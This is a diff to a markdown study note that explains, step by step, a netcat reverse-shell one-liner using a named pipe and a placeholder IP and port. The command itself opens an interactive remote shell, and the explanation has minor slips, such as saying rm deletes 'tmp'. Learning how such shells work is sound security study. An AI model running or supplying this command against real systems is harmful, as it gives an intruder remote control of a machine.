@@ -11,4 +11,5 @@ type: note
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > tmp/f
 ```
 - `rm -f /tmp/f` deletes `tmp` if it already exists
-- 
+- `mkfifo /tmp/f` creates a named pipe (FIFO), used to pass data between processes
+- `cat /tmp/f` reads commands from the pipe
